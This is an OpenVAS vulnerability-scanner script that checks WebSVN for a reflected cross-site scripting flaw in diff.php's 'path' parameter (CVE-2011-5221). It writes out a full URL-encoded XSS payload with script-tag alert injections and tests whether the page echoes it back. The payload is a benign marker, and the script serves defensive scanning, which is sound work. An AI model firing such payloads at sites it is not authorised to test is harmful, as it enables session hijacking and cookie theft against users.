###############################################################################
# OpenVAS Vulnerability Test
#
# WebSVN 'path' Parameter Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103368");
  script_bugtraq_id(51109);
  script_version("2019-05-13T14:23:09+0000");
  script_cve_id("CVE-2011-5221");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WebSVN 'path' Parameter Multiple Cross Site Scripting Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51109");
  script_xref(name:"URL", value:"http://websvn.tigris.org/");
  script_xref(name:"URL", value:"http://st2tea.blogspot.com/2011/12/websvn-cross-site-scripting.html");

  script_tag(name:"last_modification", value:"2019-05-13 14:23:09 +0000 (Mon, 13 May 2019)");
  script_tag(name:"creation_date", value:"2011-12-20 10:27:58 +0100 (Tue, 20 Dec 2011)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("secpod_websvn_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("WebSVN/Installed");

  script_tag(name:"summary", value:"WebSVN is prone to multiple cross-site scripting vulnerabilities
  because it fails to properly sanitize user-supplied input before using
  it in dynamically generated content.");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected
  site. This can allow the attacker to steal cookie-based authentication
  credentials and launch other attacks.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(! dir = get_dir_from_kb(port:port,app:"WebSVN") )exit(0);

url = string(dir,"/");
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if(!buf)
  exit(0);

repname = eregmatch(pattern:"listing.php\?repname=([a-zA-Z0-0-_]+)",string:buf);
if(isnull(repname[1]))exit(0);

url = string(dir, '/diff.php?repname=',repname[1],'&path=%2F<hr+color%3D"blue"+size%3D"70"+style%3D"border%3A+dotted+5pt%3B+border-color%3A+red+"><marquee+direction%3D"up"+scrollamount%3D"1"+height%3D"150"+style%3D"filter%3Awave(add%3D1%2C+phase%3D10%2C+freq%3D2%2C+strength%3D300)%3B+colortag%3D"red"%3B><font+color%3D"navy"+size%3D%2B3>FLYING+TEXT<%2Ffont><%2Fmarquee>',"'%3Balert(String.fromCharCode(88%2C83%2C83))%2F%2F\\'%3Balert(String.fromCharCode(88%2C83%2C83))%2F%2F",'"%3Balert(String.fromCharCode(88%2C83%2C83))%2F%2F\"%3Balert(/vt-xss-test/)%2F%2F--><%2FSCRIPT>">',
	           "'><SCRIPT>alert(/vt-xss-test/)<%2FSCRIPT>");

if(http_vuln_check(port:port, url:url,pattern:"<SCRIPT>alert\(/vt-xss-test/\)</SCRIPT>", check_header:TRUE)) {
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(0);